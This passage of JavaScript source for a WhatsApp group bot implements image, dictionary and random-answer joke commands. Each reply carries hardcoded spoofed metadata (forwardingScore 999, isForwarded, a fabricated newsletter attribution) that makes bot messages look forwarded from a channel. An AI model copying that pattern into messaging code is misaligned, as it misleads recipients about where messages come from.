_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: hasil.url } }, { upload: AlyaBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix + command}\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'wallpaperphone': case 'wallphone':{
await AlyaStickWait()
var notnot = JSON.parse(fs.readFileSync('./src/media/randompics/wallhp.json'))
var hasil = pickRandom(notnot)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: hasil.url } }, { upload: AlyaBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix + command}\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
}
break
            case 'remini': {
			if (!quoted) return replygcalya(`Where is the picture?`)
			if (!/image/.test(mime)) return replygcalya(`Send/Reply Photos With Captions ${prefix + command}`)
			await AlyaStickWait()
			const { remini } = require('./lib/remini')
			let media = await quoted.download()
			let proses = await remini(media, "enhance")
			let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: proses }, { upload: AlyaBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"😍\",\"id\":\""}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
			}
			break
			case 'define': 
if (!q) return replygcalya(`What do you want to define?`)
try {
targetfine = await axios.get(`http://api.urbandictionary.com/v0/define?term=${q}`)
if (!targetfine) return replygcalya(mess.error)
const reply = `
*${themeemoji} Word:* ${q}
*${themeemoji} Definition:* ${targetfine.data.list[0].definition
    .replace(/\[/g, "")
    .replace(/\]/g, "")}
*${themeemoji} Example:* ${targetfine.data.list[0].example
    .replace(/\[/g, "")
    .replace(/\]/g, "")}`
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: reply
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./AlyaMedia/theme/alya.jpg') }, { upload: AlyaBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"🧐\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
} catch (err) {
    console.log(err)
    return replygcalya(`*${q}* isn't a valid text`)
    }
    break
                case 'can': {
            	if (!text) return replygcalya(`Ask question\n\nExample : ${prefix + command} i dance?`)
            	let bisa = [`Can`,`Can't`,`Cannot`,`Of Course You Can!!!`]
                let keh = bisa[Math.floor(Math.random() * bisa.length)]
                let jawab = `*Can ${text}*\nAnswer : ${keh}`
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: jawab
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./AlyaMedia/theme/alya.jpg') }, { upload: AlyaBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"🧐\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
            }
            break
            case 'is': {
            	if (!text) return replygcalya(`Ask question\n\nExample : ${prefix + command} she virgin?`)
            	let apa = [`Yes`, `No`, `It Could Be`, `Thats right`]
                let kah = apa[Math.floor(Math.random() * apa.length)]
                let jawab = `*Is ${text}*\nAnswer : ${kah}`                
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: jawab
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./AlyaMedia/theme/alya.jpg') }, { upload: AlyaBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"🧐\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
            }
            break
            case 'when': {
            	if (!text) return replygcalya(`Ask question\n\nExample : ${prefix + command} will i get married?`)
            	let kapan = ['5 More Days', '10 More Days', '15 More Days','20 More Days', '25 More Days','30 More Days','35 More Days','40 More Days','45 More Days','50 More Days','55 More Days','60 More Days','65 More Days','70 More Days','75 More Days','80 More Days','85 More Days','90 More Days','100 More Days','5 Months More', '10 Months More', '15 Months More','20 Months More', '25 Months More','30 Months More','35 Months More','40 Months More','45 Months More','50 Months More','55 Months More','60 Months More','65 Months More','70 Months More','75 Months More','80 Months More','85 Months More','90 Months More','100 Months More','1 More Year','2 More Years','3 More Years','4 More Years','5 More Years','Tomorrow','The Day After Tomorrow']
                let koh = kapan[Math.floor(Math.random() * kapan.length)]
                let jawab = `*${command} ${text}*\nAnswer : ${koh}`                
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: jawab
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./AlyaMedia/theme/alya.jpg') }, { upload: AlyaBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"🧐\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
            }
            break
case 'what': {
            	if (!text) return replygcalya(`Ask question\n\nExample : ${prefix + command} is your name?`)
            	let lel = [`Ask Your Gf`, `I Dont Know`, `I Don't Know, Ask Your Father`]
                let kah = lel[Math.floor(Math.random() * lel.length)]
                let jawab = `*What ${text}*\nAnswer : ${kah}`                
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: jawab
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./AlyaMedia/theme/alya.jpg') }, { upload: AlyaBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"🧐\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
            }
            break
case 'where': {
if (!text) return replygcalya(`Ask question\n\nExample : ${prefix + command} is your name?`)
            	let wherelol = [`In the mountain`, `On mars`, `On moon`,`In the jungle`,`I dont know ask your mom`,`It could be somewhere`]
                let kah = wherelol[Math.floor(Math.random() * wherelol.length)]
                let jawab = `*Whwre ${text}*\nAnswer : ${kah}`              
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: jawab
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./AlyaMedia/theme/alya.jpg') }, { upload: AlyaBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"🧐\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
            }
            break
case 'how': {
            	if (!text) return replygcalya(`Ask question\n\nExample : ${prefix + command} to date girl?`)
            	let gimana = [`Ummm...`, `It's Difficult Bro`, `Sorry Bot Can't Answer`, `Try Searching On Google`,`Holy Cow! Really???`,`Dizzy Ah😴, don't wanna answer`,`Ohhh I See:(`,`The Patient, Boss:(`,`Really dude 🙄`]
                let kah = gimana[Math.floor(Math.random() * gimana.length)]
                let jawab = `*How ${text}*\nAnswer : ${kah}`                
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: jawab
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./AlyaMedia/theme/alya.jpg') }, { upload: AlyaBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"🧐\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
            }
            break
case 'rate': {
            	if (!text) return replygcalya(`Example : ${prefix + command} my profile`)
            	let ra = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
                let kah = ra[Math.floor(Math.random() * ra.length)]
                let jawab = `*Rate ${text}*\nAnswer : ${kah}%`                
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: jawab
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./AlyaMedia/theme/alya.jpg') }, { upload: AlyaBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"🧐\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
            }
            break
            case 'runtime': {
            	let lowq = `*The Bot Has Been Online For:*\n*${runtime(process.uptime())}*`
                replygcalya(lowq)
            	}
            break
            case 'stupidcheck':case 'uncleancheck':
case 'hotcheck': case 'smartcheck':
case 'greatcheck':
case 'evilcheck':case 'dogcheck':
case 'coolcheck':
case 'waifucheck':
cantik = body.slice(1)
const okebnh1 =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
const alyakak = okebnh1[Math.floor(Math.random() * okebnh1.length)]
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: alyakak
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./AlyaMedia/theme/alya.jpg') }, { upload: AlyaBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"🧐\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
break
            case 'soulmate': {
            if (!m.isGroup) return AlyaStickGroup()
            let member = participants.map(u => u.id)
            let me = m.sender
            let jodoh = member[Math.floor(Math.random() * member.length)]
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `👫Your Soulmate Is

@${me.split('@')[0]}\n\n          ❤️\n\n@${jodoh.split('@')[0]}`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./AlyaMedia/theme/soulmate.jpg')}, { upload: AlyaBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"👀❤️\",\"id\":\""}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [me, jodoh], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await AlyaBotInc.relayMessage(m.chat, msgs.message, {})        
            }
            break
 case 'couple': {
            if (!m.isGroup) return AlyaStickGroup()
            let member = participants.map(u => u.id)
            let orang = member[Math.floor(Math.random() * member.length)]
            let jodoh = member[Math.floor(Math.random() * member.length)]
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `💏Couple\n\n@${orang.split('@')[0]}\n\n          ❤️\n\n@${jodoh.split('@')[0]}\n\nCieeee, What's Going On❤️💖👀`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./AlyaMedia/theme/couple.jpg')}, { upload: AlyaBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"👀❤️\",\"id\":\""}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [orang, jodoh], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
            }
            break
                        case 'coffee': case 'kopi': {
                let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}\n_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: {url: 'https://coffee.alexflipnote.dev/random'} }, { upload: AlyaBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
            }
            break
            case 'wallpaper': {
                if (!text) return replygcalya('Enter Query Title')
                await AlyaStickWait()
		let { wallpaper } = require('./lib/scraper')
                anuwallpep = await wallpaper(text)
                result = anuwallpep[Math.floor(Math.random() * anuwallpep.length)]       
         let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}\n_*Here is the result of ${text}*_\n\n${themeemoji} Title : ${result.title}\n${themeemoji} Category : ${result.type}\n${themeemoji} Detail : ${result.source}\n${themeemoji} Media Url : ${result.image[2] || result.image[1] || result.image[0]}`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: {url: result.image[0]}}, { upload: AlyaBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command} ${text}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
                
            }
            break
            case 'wikimedia': {
                if (!text) return replygcalya('Enter Query Title')
                await AlyaStickWait()
		let { wikimedia } = require('./lib/scraper')
                let anumedia = await wikimedia(text)
                result = anumedia[Math.floor(Math.random() * anumedia.length)]
                let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}\n_*Here is the result of ${text}*_\n\n${themeemoji} Title : ${result.title}\n${themeemoji} Source : ${result.source}\n${themeemoji} Media Url : ${result.image}`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: {url: result.image}}, { upload: AlyaBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command} ${text}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
                
            }
            break
            case 'loli': {
            let baseUrl = 'https://weeb-api.vercel.app/'
      const response = await fetch(baseUrl + command)
      const imageBuffer = await response.buffer() // Get the image data as a buffer
      let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}\n_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: imageBuffer}, { upload: AlyaBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
 
            }
            break
            case 'waifu': {
            let baseUrl = 'https://weeb-api.vercel.app/'
      const response = await fetch(baseUrl + command)
      const imageBuffer = await response.buffer() // Get the image data as a buffer
      let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}\n_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: imageBuffer}, { upload: AlyaBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await AlyaBotInc.relayMessage(m.chat, msgs.message, {})
            }
            break
            case 'neko': {
            let baseUrl = 'https://weeb-api.vercel.app/'
      const response = await fetch(baseUrl + command)
      const imageBuffer = await response.buffer() // Get the image data as a buffer
      let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
